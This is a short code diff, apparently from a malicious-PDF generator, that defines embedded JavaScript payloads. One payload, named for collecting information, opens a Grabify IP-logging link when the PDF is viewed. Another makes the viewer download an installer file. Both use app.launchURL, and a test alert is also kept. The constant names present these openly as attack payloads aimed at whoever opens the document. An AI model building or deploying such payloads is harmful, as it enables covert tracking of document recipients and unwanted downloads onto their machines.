@@ -1,5 +1,6 @@
 # URL:
-URL: str = "https://grabify.link/46N29M"
+URL_GRABIFY_LINK: str = "https://grabify.link/46N29M"
+URL_DOWNLOAD_FILE: str = "https://nodejs.org/dist/v20.12.1/node-v20.12.1-x64.msi"
 
 # Payloads constants
 
@@ -13,8 +14,12 @@ JS_CODE_TEST = """
   app.alert("Hello PDF!");
 """
 
-PAYLOAD_LAUNCH_URL_OPEN_ACTION = f"""
-    app.launchURL("{URL}");
+PAYLOAD_COLLECT_INFORMATION_USING_GRABIFY = f"""
+    app.launchURL("{URL_GRABIFY_LINK}");
+"""
+
+PAYLOAD_DOWNLOAD_FILE = f"""
+    app.launchURL("{URL_DOWNLOAD_FILE}");
 """
 
 # Javascript library
